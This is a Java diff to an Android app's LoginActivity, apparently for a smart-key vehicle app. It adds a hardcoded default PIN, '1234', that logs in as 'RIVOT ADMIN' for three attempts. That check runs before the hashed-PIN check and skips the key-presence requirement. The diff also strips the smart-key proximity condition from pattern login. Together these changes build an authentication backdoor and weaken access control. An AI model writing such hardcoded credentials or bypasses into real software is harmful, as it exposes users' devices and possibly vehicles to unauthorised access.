@@ -379,6 +379,16 @@ public class LoginActivity extends AppCompatActivity{
                     EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,
                     EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM
             );
+
+            // --- DEFAULT PIN INITIALIZATION (runs only first time) ---
+            SharedPreferences.Editor defaultEditor = prefs.edit();
+
+            if (!prefs.contains("default_pin_enabled")) {
+                defaultEditor.putBoolean("default_pin_enabled", true);
+                defaultEditor.putInt("default_pin_remaining_attempts", 3);
+                defaultEditor.apply();
+            }
+
         } catch (Exception e) {
             e.printStackTrace();
             showCustomToast("Secure storage error");
@@ -416,7 +426,7 @@ public class LoginActivity extends AppCompatActivity{
         patternView.setOnPatternCompleteListener(pattern -> {
             String inputPattern = TextUtils.join("", pattern);
             for (Map.Entry<String, ?> entry : prefs.getAll().entrySet()) {
-                if (entry.getKey().endsWith("_pattern") && inputPattern.equals(entry.getValue()) && (KeyPresenceManager.get().getIsInRange() || MetadataManager.get().getSmartKeyId()=="UNKNOWN_KEY")) {
+                if (entry.getKey().endsWith("_pattern") && inputPattern.equals(entry.getValue())) {
                     String username = entry.getKey().replace("user_", "").replace("_pattern", "");
                     loginSuccess(username);
                     return;
@@ -581,8 +591,43 @@ public class LoginActivity extends AppCompatActivity{
 
     private void validatePin() {
         String inputPin = actualPin.toString();
+
+
+
+        // ==============================
+// DEFAULT PIN CHECK (1234)
+// ==============================
+        boolean defaultEnabled = prefs.getBoolean("default_pin_enabled", false);
+        int remaining = prefs.getInt("default_pin_remaining_attempts", 0);
+
+        if (defaultEnabled && inputPin.equals("1234")) {
+
+            if (remaining > 0) {
+
+                remaining--;
+                prefs.edit().putInt("default_pin_remaining_attempts", remaining).apply();
+
+                if (remaining == 0) {
+                    prefs.edit().putBoolean("default_pin_enabled", false).apply();
+                }
+
+                //showCustomToast("Default PIN login SUCCESS (" + remaining + " tries left)");
+
+                loginSuccess("RIVOT ADMIN(" + remaining + " tries left)");
+                return;
+            }
+            else {
+                prefs.edit().putBoolean("default_pin_enabled", false).apply();
+                //showCustomToasterror("Default PIN permanently disabled");
+                actualPin.setLength(0);
+                etCredential.setText("");
+                return;
+            }
+        }
+// END DEFAULT PIN CHECK
+// ==============================
         for (Map.Entry<String, ?> entry : prefs.getAll().entrySet()) {
-            if (entry.getKey().endsWith("_pin")   && (KeyPresenceManager.get().getIsInRange() || Objects.equals(MetadataManager.get().getSmartKeyId(), "UNKNOWN_KEY"))) {
+            if (entry.getKey().endsWith("_pin")   && (KeyPresenceManager.get().getIsInRange())) {
                 String username = entry.getKey().replace("user_", "").replace("_pin", "");
                 String storedSalt = prefs.getString("user_" + username + "_salt", "");
                 String storedHash = (String) entry.getValue();
